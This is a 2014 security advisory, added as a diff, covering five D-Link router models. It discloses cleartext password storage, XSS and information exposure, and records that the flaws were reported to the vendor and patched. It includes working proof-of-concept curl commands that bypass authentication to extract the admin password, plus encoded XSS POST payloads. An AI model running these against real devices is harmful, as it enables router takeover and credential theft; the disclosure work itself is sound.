@@ -1,0 +1,105 @@
+The following five D-Link model routers suffer from several
+vulnerabilities including Clear Text Storage of Passwords, Cross Site
+Scripting and Sensitive Information Disclosure.
+
+DIR-652
+D-Link  Wireless N Gigabit Home Router
+
+DIR-835
+D-Link Network DIR-835L Wireless N 750M Dual-band 802.11n 4Port Gigabit Router
+
+DIR-855L -
+D-Link Wireless N900 Dual Band Gigabit Router
+
+DGL-5500
+D-Link AC1300 Gaming Router
+
+DHP-1565
+D-Link Wireless N PowerLine Gigabit Router
+
+Affected firmware - FW 1.02b18/1.12b02 or older
+
+Access - Remote
+Complexity - Low
+Authentication - None
+Impact - Full loss of confidentiality
+
+-------------------------------------------------------------------------------------------------------------
+Clear Text Password - CWE - CWE-316: Cleartext Storage of Sensitive Information
+
+Authentication can be bypassed to gain access to the file
+tools_admin.asp, which stores the devices admin password in plain
+text, by adding a "/" to the end of the URL.
+
+Proof of Concept for the DGL-5500, DIR-855L and the DIR-835:
+
+curl -s http://<IP>/tools_admin.asp/ |awk '/hidden/ &&
+/admin_password_tmp/ && /value/ {print $5}'
+
+PoC for the DHP-1565 and DIR-652, the generic 'user' must be added.
+
+curl -s http://<IP>/tools_admin.asp/ -u user:|awk '/hidden/ &&
+/admin_password_tmp/ && /value/ {print $5}'
+
+-------------------------------------------------------------------------------------------------------------
+Cross Site Scripting - CWE - CWE-79: Improper Neutralization of User
+Input / Return
+
+For the file "apply.cgi" ("apply_sec.cgi" on the DGL-5500) the POST
+param "action" suffers from a XSS vulnerability due to improper
+neutralization of user input / return output.
+
+PoC for DIR-855L, DIR-835, DHP-1565
+
+http://<IP>/apply.cgi
+
+POST
+graph_code=X&session_id=123456&login_n=user&login_name=8&action=%3Cbody%3E%3Chtml%3E%3Ch2%3E%3CEMBED%20src%3D%22%3Ctd%20dir%3D%22rtl%22class%3D%22skytext%22width%3D%2277%25%22%3E%3Cmarquee%20%20%20scrollAmount%3D5%20scrollDelay%3D10%20direction%3D%22right%22style%3D%22color%3Ared%3Bfont-weight%3Abold%3B%22%3ESquirrel%20Injection%22%3C%2fh2%3E%3C%2fmarquee%3E%20%3C%2fbody%3E%3C%2fhtml%3E%3C%2ftd%3E%3E&log_pass=&html_response_page=login_pic.asp&tmp_log_pass=&gcode_base64=MTg0MzU%3D
+HTTP/1.1
+
+For the DGL-5500
+
+http://<IP>/apply_sec.cgi
+
+POST
+graph_code=X&session_id=123456&login_n=user&login_name=8&action=%3Cbody%3E%3Chtml%3E%3Ch2%3E%3CEMBED%20src%3D%22%3Ctd%20dir%3D%22rtl%22class%3D%22skytext%22width%3D%2277%25%22%3E%3Cmarquee%20%20%20scrollAmount%3D5%20scrollDelay%3D10%20direction%3D%22right%22style%3D%22color%3Ared%3Bfont-weight%3Abold%3B%22%3ESquirrel%20Injection%22%3C%2fh2%3E%3C%2fmarquee%3E%20%3C%2fbody%3E%3C%2fhtml%3E%3C%2ftd%3E%3E&log_pass=&html_response_page=login_pic.asp&tmp_log_pass=&gcode_base64=MTg0MzU%3D
+HTTP/1.1
+
+-------------------------------------------------------------------------------------------------------------
+Sensitive Information Disclosure - CWE - CWE-200: Information Exposure
+
+The D-Link models DGL-5500, DIR-855L, DIR-835 suffer from a
+vulnerability which an unauthenticated person can gain access the
+sensitive files:
+
+http://<IP>:8080/hnap.cgi and /HNAP1/ via:
+
+curl -s curl -s http://<IP>:8080/HNAP1/
+
+On the DIR-652  and DHP-1565, a user needs authentication first to
+gain access to these files.
+
+But more importantly, an unauthenticated user can browse directly to
+http://<IP>/cgi/ssi/ which will offer a download of the device's ELF
+MBS MIPS file. The file contains most of the devices internal working
+structure and sensitive information. These particular routers use  a
+MSB EM_MIPS Processor and it does contain executable components.
+
+The file can be accessed through at least one known cgi file, however
+there maybe others. Although no known publicly working example exist
+to my knowledge, unpatched devices are susceptible to injection of
+malicious code and most likely susceptible to a payload which could
+deploy a self-replicating worm.
+-------------------------------------------------------------------------------------------------------------
+
+These items were reported to D-Link on April 20th, and to US Cert on
+April 21. D-Link does have patches available for all affected models,
+and it is highly recommended to update the device's firmware as soon
+as possible.
+
+Vendor Links:
+http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10025
+http://securityadvisories.dlink.com/security/
+
+Research Contact - Kyle Lovett
+May 21, 2014
